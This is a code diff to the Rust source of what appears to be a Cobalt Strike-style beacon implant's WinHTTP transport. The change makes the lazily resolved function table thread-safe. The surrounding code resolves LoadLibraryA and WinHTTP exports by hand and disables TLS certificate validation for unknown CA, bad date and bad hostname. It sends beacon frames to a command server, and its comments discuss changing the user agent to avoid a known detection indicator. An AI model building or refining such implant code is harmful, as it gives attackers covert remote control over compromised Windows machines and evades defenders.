@@ -157,14 +157,17 @@ type FQueryData = unsafe extern "system" fn(HINTERNET, *mut u32) -> i32;
 /// Adds (or replaces) HTTP request headers. Used for the profile's client-block
 /// static headers and for a header-terminator (transformed bytes in a header).
 type FAddReqHeaders = unsafe extern "system" fn(HINTERNET, *const u16, u32, u32) -> i32;
-
-static mut WINHTTP: Option<WinhttpFns> = None;
+/// WinHTTP function table, stored as a raw pointer in an AtomicUsize.
+/// 0 = uninitialized, 1 = init failed (winhttp.dll unavailable),
+/// otherwise = pointer to a leaked `WinhttpFns`.
+static WINHTTP: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
 
 /// Resolve the WinHTTP function table once (no allocation).
 pub unsafe fn ensure_winhttp() {
-    use core::sync::atomic::{AtomicBool, Ordering};
-    static DONE: AtomicBool = AtomicBool::new(false);
-    if DONE.load(Ordering::Acquire) {
+    use core::sync::atomic::Ordering;
+    // Fast path: already attempted (success or failure).
+    let cur = WINHTTP.load(Ordering::Acquire);
+    if cur != 0 {
         return;
     }
     // winhttp.dll is NOT loaded by default — resolve LoadLibraryA from
@@ -181,8 +184,8 @@ pub unsafe fn ensure_winhttp() {
         }
     }
     if !winhttp_loaded {
-        // Can't load winhttp — transport unavailable.
-        DONE.store(true, Ordering::Release);
+        // Can't load winhttp — mark as failed (sentinel 1) so we don't retry.
+        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
         return;
     }
     let o = export_addr(b"winhttp.dll", b"WinHttpOpen");
@@ -202,7 +205,7 @@ pub unsafe fn ensure_winhttp() {
     if let (Some(o), Some(c), Some(r), Some(s), Some(v), Some(d), Some(cl), Some(q)) =
         (o, c, r, s, v, d, cl, q)
     {
-        WINHTTP = Some(WinhttpFns {
+        let fns = alloc::boxed::Box::new(WinhttpFns {
             open: core::mem::transmute(o),
             connect: core::mem::transmute(c),
             open_request: core::mem::transmute(r),
@@ -221,7 +224,17 @@ pub unsafe fn ensure_winhttp() {
                 None => None,
             },
         });
-        DONE.store(true, Ordering::Release);
+        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
+        // One-time install. If we lost the race, free our allocation.
+        match WINHTTP.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
+            Ok(_) => {}
+            Err(_) => {
+                drop(alloc::boxed::Box::from_raw(ptr as *mut WinhttpFns));
+            }
+        }
+    } else {
+        // Export resolution failed — mark as failed.
+        let _ = WINHTTP.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
     }
 }
 
@@ -248,7 +261,14 @@ pub unsafe fn post_frame(
     use_tls: bool,
 ) -> Option<Vec<u8>> {
     ensure_winhttp();
-    let fns = unsafe { (*{ &raw const WINHTTP }).as_ref() }?;
+    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
+    // 0 = not attempted, 1 = init failed. Both mean no transport available.
+    if ptr <= 1 {
+        return None;
+    }
+    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
+    // for the process lifetime and is never freed.
+    let fns = unsafe { &*(ptr as *const WinhttpFns) };
     // User-agent: the profile's `set useragent` (baked at build) overrides the
     // transport default. CS's default beacon UA is a well-known IOC, so a real
     // engagement sets one in the profile.
@@ -334,8 +354,11 @@ pub unsafe fn post_frame(
         let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
             | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-        let set_option = fns.set_option.unwrap();
-        if set_option(
+        let set_opt = match fns.set_option {
+            Some(f) => f,
+            None => return None,
+        };
+        if set_opt(
             req,
             WINHTTP_OPTION_SECURITY_FLAGS,
             &tls_flags as *const u32 as *const u8,
@@ -472,7 +495,13 @@ pub unsafe fn post_frame_enhanced(
     opts: &HttpOpts<'_>,
 ) -> Option<Vec<u8>> {
     ensure_winhttp();
-    let fns = unsafe { (*{ &raw const WINHTTP }).as_ref() }?;
+    let ptr = WINHTTP.load(core::sync::atomic::Ordering::Acquire);
+    if ptr <= 1 {
+        return None;
+    }
+    // SAFETY: pointer was stored by ensure_winhttp via Box::leak; it lives
+    // for the process lifetime and is never freed.
+    let fns = unsafe { &*(ptr as *const WinhttpFns) };
 
     let ua_bytes: &[u8] = if crate::envelopes::POST_CLIENT_UA.is_empty() {
         b"Mozilla/5.0"
@@ -588,8 +617,11 @@ pub unsafe fn post_frame_enhanced(
         let tls_flags: u32 = SECURITY_FLAG_IGNORE_UNKNOWN_CA
             | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-        let set_option = fns.set_option.unwrap();
-        if set_option(
+        let set_opt = match fns.set_option {
+            Some(f) => f,
+            None => return None,
+        };
+        if set_opt(
             req,
             WINHTTP_OPTION_SECURITY_FLAGS,
             &tls_flags as *const u32 as *const u8,
